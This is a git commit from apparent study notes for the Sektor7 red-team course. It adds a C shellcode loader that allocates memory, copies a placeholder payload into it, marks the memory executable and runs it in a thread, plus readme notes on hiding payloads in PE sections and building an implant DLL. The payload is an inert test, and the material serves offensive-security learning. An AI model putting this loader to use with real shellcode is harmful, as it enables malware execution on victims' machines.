21f35a22cd4036c68a1eaa4316528163f632894a
fanbyprinciple <fanbyprinciple@gmail.com>
2022-05-14 20:40:07 -0700

    sektor7: loading into data section

---
+++ sektor7_red_team_operator/loading_into_data_section.c
@@ -0,0 +1,43 @@
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+unsigned char payload[] = {
+	0x90,
+	0x90,
+	0xcc,
+	0xc3
+};
+
+unsigned int payload_len = 4;
+
+int main(void) {
+
+	LPVOID exec_mem;
+	bool rv;
+	HANDLE th;
+	DWORD oldprotect = 0;
+
+	//Allocate a memory buffer for payload
+	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	printf("%x addr of payload\n", &payload);
+	printf("%x exec memory address\n", exec_mem);
+
+	//copy memory to buffer
+	RtlMoveMemory(exec_mem, payload, payload_len);
+
+	// make a new buffer as executable
+	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+
+	printf("\nHit me!\n");
+	getchar();
+
+	if (rv != 0) {
+		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
+		WaitForSingleObject(th, -1);
+	}
+
+	return 0;
+
+}
--- sektor7_red_team_operator/readme.md
+++ sektor7_red_team_operator/readme.md
@@ -20,4 +20,24 @@ dumpbin in windows also performs the same activity as the metadata
  headers - metadata
  section - content of PE
 
- 
+we can make dll through clang
+`
+//cl.exe /D_USRDLL /D_WINDLL stand_in_app.cpp /MT /link /DLL /OUT:implant.dll`
+
+### places to put your payload
+
+in order to put shellcode in text section we need to put it in someplace like `.text` section that is the main program.
+
+to put it in data we need to tell the compiler that `.shellcode` is read only memory
+
+to put in `.rsrc` section,  we need to use certain api calls to call the shellcoden 
+
+### putting payload in  data section
+
+our variable ended in the data section because we delared it as a global variable.
+
+looking at the address
+38a000 addr of payload
+7d0000 exec memory address
+
+
